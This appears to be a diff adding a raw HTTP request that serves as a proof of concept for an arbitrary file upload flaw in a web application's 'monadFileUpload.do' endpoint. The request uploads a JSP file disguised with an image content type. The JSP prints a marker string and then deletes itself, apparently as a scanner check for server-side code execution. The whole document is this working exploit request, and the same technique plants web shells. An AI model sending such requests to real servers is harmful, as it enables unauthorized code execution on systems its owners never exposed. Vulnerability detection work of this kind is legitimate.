@@ -1,0 +1,10 @@
+POST /manage/leaveList/monadFileUpload.do?recoToken=67mds2pxXQb&type HTTP/1.1
+Host:
+Content-Type: multipart/form-data; boundary=----WebKitFormBundaryFfJZ4P1AZBixjELj
+
+----WebKitFormBundaryFfJZ4P1AZBixjELj
+Content-Disposition: form-data; name="file"; filename="ncbegw.jsp"
+Content-Type: image/jpeg
+
+<% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+----WebKitFormBundaryFfJZ4P1AZBixjELj
